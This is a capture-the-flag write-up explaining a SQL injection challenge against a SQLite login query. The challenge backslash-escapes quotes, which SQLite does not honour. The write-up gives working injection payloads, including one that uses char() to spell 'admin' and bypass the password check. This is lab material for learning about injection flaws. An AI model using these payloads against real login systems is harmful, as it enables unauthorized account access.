---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 38
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/4f8d6e75-d77a-487a-9a87-463fd8f15b4a)

We are provided with the SQLite query:

```sqlite
SELECT id FROM member WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

If we provide the following URI parameter:

```
?id=admin' -- -
```

The challenge adds a slash `\` character before the single-quote `'`. The resultant query becomes:

```sqlite
SELECT id FROM member WHERE id='admin\' -- -' AND pw='{$_GET[pw]}'
```

In SQLite however, the slash `\` characcter does not act as an escape character. Therefore, `admin\` is treated as a string.

In order to work around this we have to use the `char()` function, as `hex()` is not allowed in SQLite.

We can provide the following URI parameter:

```
?id=admin' OR id=char(97,100,109,105,110) -- -
```

The resultant query becomes:

```sqlite
SELECT id FROM member WHERE id='admin\' OR id=char(97,100,109,105,110) -- -' AND pw=''
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/bf14c154-db21-4066-b055-c8ed4682dd76)
